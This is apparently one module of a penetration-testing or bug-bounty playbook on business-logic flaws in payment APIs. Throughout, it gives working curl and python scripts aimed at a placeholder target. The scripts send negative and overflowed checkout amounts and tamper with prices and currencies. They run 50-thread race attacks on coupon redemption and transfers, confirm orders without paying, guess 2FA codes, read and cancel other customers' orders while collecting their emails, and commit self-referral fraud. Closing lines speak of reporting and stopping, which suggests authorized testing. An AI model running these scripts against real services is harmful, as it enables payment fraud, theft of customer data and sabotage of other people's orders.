# M5_BUSINESS — Business Logic · Race Conditions · Financial Impact
# Trigger: found /pay /checkout /transfer /coupon /promo /balance /subscription
# Needs: TARGET · TOKEN · VICTIM_ORDER_ID · PROMO_CODE

TARGET="https://TARGET"
TOKEN="Bearer JWT"
VICTIM_ORDER="ORDER_ID"
PROMO="PROMO_CODE"

## [BL1] Negative / zero / overflow — amounts and quantities

for amount in -100 -1 0 0.001 0.01 -0.01 9999999 2147483648 -2147483648; do
  RESP=$(curl -sk -X POST "$TARGET/api/checkout" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d "{\"amount\": $amount, \"product_id\": \"1\"}")
  echo "amount=$amount → $(echo $RESP | head -c 120)"
  echo "$RESP" | grep -iE "success|paid|balance|charged|order" | head -2 && \
    echo "[P0] neg-amount | /checkout amount=$amount | financial impact"
done

for qty in -1 0 2147483648; do
  curl -sk -X POST "$TARGET/api/cart/add" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d "{\"product_id\":\"1\",\"quantity\":$qty}" | head -c 150
done

## [BL2] Currency / price confusion

# Swap currency parameter
curl -sk -X POST "$TARGET/api/checkout" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"amount":100,"currency":"KZT","product_id":"1"}'  # instead of USD/EUR

# Price from client param (not server-side)
curl -sk -X POST "$TARGET/api/cart/checkout" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"items":[{"product_id":"1","price":0.01,"quantity":1}]}'

## [BL3] Race condition — coupons / balance / transfers

# Check balance BEFORE
BAL_BEFORE=$(curl -sk "$TARGET/api/profile" \
  -H "Authorization: $TOKEN" | python3 -c \
  "import sys,json; d=json.load(sys.stdin); print(d.get('balance',d.get('credits','?')))" 2>/dev/null)
echo "Balance before: $BAL_BEFORE"

# 50 parallel requests
python3 -c "
import concurrent.futures, requests, time
URL = '$TARGET/api/redeem-coupon'
HEADERS = {'Authorization': '$TOKEN', 'Content-Type': 'application/json'}
BODY = {'code': '$PROMO'}
start = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as e:
    futures = [e.submit(requests.post, URL, headers=HEADERS, json=BODY) for _ in range(50)]
results = [f.result() for f in futures]
wins = [r for r in results if r.status_code == 200]
print(f'Wins: {len(wins)}/50 — elapsed: {time.time()-start:.2f}s')
for w in wins[:3]: print(w.text[:100])
"
# >1 win = race condition P0

# Check balance AFTER
BAL_AFTER=$(curl -sk "$TARGET/api/profile" \
  -H "Authorization: $TOKEN" | python3 -c \
  "import sys,json; d=json.load(sys.stdin); print(d.get('balance',d.get('credits','?')))" 2>/dev/null)
echo "Balance after: $BAL_AFTER"
[ "$BAL_BEFORE" != "$BAL_AFTER" ] && echo "[P0] race | /redeem-coupon | $BAL_BEFORE → $BAL_AFTER"

# Transfer race (if endpoint exists)
python3 -c "
import concurrent.futures, requests
URL = '$TARGET/api/transfer'
H = {'Authorization': '$TOKEN', 'Content-Type': 'application/json'}
B = {'amount': 100, 'to': 'VICTIM_ID'}
with concurrent.futures.ThreadPoolExecutor(50) as e:
    futures = [e.submit(requests.post, URL, headers=H, json=B) for _ in range(50)]
wins = [f.result() for f in futures if f.result().status_code == 200]
print(f'Transfer wins: {len(wins)}')
"

## [BL4] Step skipping — workflow bypass

# Confirm payment without actual payment
curl -sk -X POST "$TARGET/api/checkout/confirm" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"order_id":"1","payment_status":"paid"}' | head -c 200

curl -sk -X POST "$TARGET/api/subscription/activate" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"plan":"premium"}' | head -c 200

# 2FA bypass — hit /verify without real code
curl -sk -X POST "$TARGET/api/auth/verify-2fa" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"code":"000000"}' | head -c 200

curl -sk -X POST "$TARGET/api/auth/complete-login" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{}' | head -c 200

## [BL5] IDOR on other's orders / subscriptions

for oid in $VICTIM_ORDER $((RANDOM)) $((RANDOM+1000)); do
  RESP=$(curl -sk "$TARGET/api/orders/$oid" -H "Authorization: $TOKEN")
  EMAIL=$(echo $RESP | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email',''))" 2>/dev/null)
  [ -n "$EMAIL" ] && echo "[P0] order-IDOR | /api/orders/$oid | email=$EMAIL"

  # Cancel other's order
  curl -sk -X POST "$TARGET/api/orders/$oid/cancel" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d '{"reason":"test"}' | head -c 100
done

## [BL6] Referral / affiliate abuse

# Self-referral
MY_REF_CODE=$(curl -sk "$TARGET/api/profile" \
  -H "Authorization: $TOKEN" | python3 -c \
  "import sys,json; d=json.load(sys.stdin); print(d.get('referral_code',''))" 2>/dev/null)

curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"alt@1secmail.com\",\"password\":\"Test123!\",\"referral_code\":\"$MY_REF_CODE\"}"
# Check balance → did self-referral bonus apply?

## [BL7] Price parameter injection

# Price in URL parameter
for ep in api/checkout api/payment/init api/subscription/subscribe; do
  curl -sk -X POST "$TARGET/$ep?price=1&amount=1" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d '{"product_id":"premium","plan":"yearly"}' | head -c 200
done

## TRIGGERS

→ Race wins > 1 → [P0] immediate report — stop, don't repeat exploitation
→ Found webhook /callback payment → M6_NONSTANDARD [N5] webhook replay
→ Negative amount accepted → escalate — verify real balance via profile
